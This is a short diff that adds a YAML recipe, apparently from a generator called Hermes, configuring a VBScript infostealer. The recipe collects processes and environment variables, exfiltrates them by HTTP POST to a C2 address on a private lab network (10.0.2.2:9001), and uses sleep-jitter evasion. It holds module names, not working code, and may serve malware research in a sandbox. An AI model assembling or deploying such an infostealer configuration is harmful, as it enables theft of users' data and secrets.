@@ -1,0 +1,17 @@
+name: infostealer_cs_vbscript
+description: Auto-generated recipe by Hermes (vbscript)
+format: vbscript
+core:
+- core/emit_buffer
+- core/run_cmd
+- core/file_ops
+collectors:
+- collectors/processes
+- collectors/env_vars
+exfil: exfil/http_post
+arch: arch/sequential
+evasion:
+- evasion/sleep_jitter
+vars:
+  C2_IP: 10.0.2.2
+  C2_PORT: '9001'
